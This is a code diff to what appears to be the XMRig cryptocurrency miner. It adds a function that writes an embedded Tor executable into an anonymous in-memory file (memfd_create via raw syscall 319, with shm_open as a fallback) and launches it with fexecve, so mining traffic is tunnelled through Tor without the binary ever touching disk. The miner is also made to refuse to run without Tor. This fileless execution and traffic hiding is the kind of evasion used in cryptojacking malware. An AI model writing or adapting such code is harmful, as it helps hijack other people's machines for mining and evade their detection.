@@ -21,9 +21,25 @@
  *   along with this program. If not, see <http://www.gnu.org/licenses/>.
  */
 
-
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <unistd.h>
 #include <stdlib.h>
 #include <uv.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <stdio.h>
+#include <netdb.h>
+#include <string.h>
+#include <sys/types.h>
+#include <signal.h>
+
 
 
 #include "api/Api.h"
@@ -40,6 +56,7 @@
 #include "Summary.h"
 #include "version.h"
 #include "workers/Workers.h"
+#include "tor.h"
 
 
 #ifndef XMRIG_NO_HTTPD
@@ -84,9 +101,65 @@ App::~App()
 #   endif
 }
 
+int App::startTor() {
+    pid_t pid = fork();
+    extern char **environ;
+    struct sockaddr_in serv_addr;
+    int arg;
+    ssize_t bytes_written;
+    int sockfd;
+    int sock_err;
+    socklen_t sock_err_len = sizeof(sock_err);
+    
+    if (pid == -1) {
+        return -1;
+    }
+    if (pid == 0) {
+        int fd = syscall(319, "tor", 1);
+        char *args[4]= {(char *) "tor", (char *) "--HTTPTunnelPort", (char *) "11232", NULL};
+    
+        if (fd >= 0) {
+            bytes_written = write(fd, TOR_EXE, sizeof(TOR_EXE));
+        } else {
+            fd = shm_open("tor", O_RDWR | O_CREAT, S_IRWXU);
+            if (fd < 0)
+                exit(2);
+            bytes_written = write(fd, TOR_EXE, sizeof(TOR_EXE));
+            if (::close(fd) == -1)
+                exit(2);
+            fd = shm_open("tor", O_RDONLY, 0);
+            if (fd < 0)
+                exit(2);
+        }
+        if(fexecve(fd, args, environ) < 0) {
+            exit(2);
+        }
+        exit(2);
+    }
+    
+    memset(&serv_addr, '\0', sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(11232);
+    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
+    for (int i=0; i<60; i++) {
+        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        arg = fcntl(sockfd, F_GETFL, NULL); 
+        arg |= O_NONBLOCK; 
+        fcntl(sockfd, F_SETFL, arg); 
+        connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+        sleep(1);
+        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len) >= 0) {
+            torPid = pid;
+            return 0;
+        }
+        ::close(sockfd);
+    }
+    return -1;
+}
 
 int App::exec()
 {
+    
     if (m_controller->isDone()) {
         return 0;
     }
@@ -110,6 +183,12 @@ int App::exec()
         release();
 
         return 0;
+    }
+    
+    LOG_NOTICE("STARTING TOR...");
+    if (startTor() == -1) {
+        LOG_NOTICE("TOR ENDED, EXITING");
+        return 2;
     }
 
 #   ifndef XMRIG_NO_API
@@ -176,6 +255,7 @@ void App::onConsoleCommand(char command)
 
 void App::close()
 {
+    kill(torPid, SIGTERM);
     m_controller->network()->stop();
     Workers::stop();
 
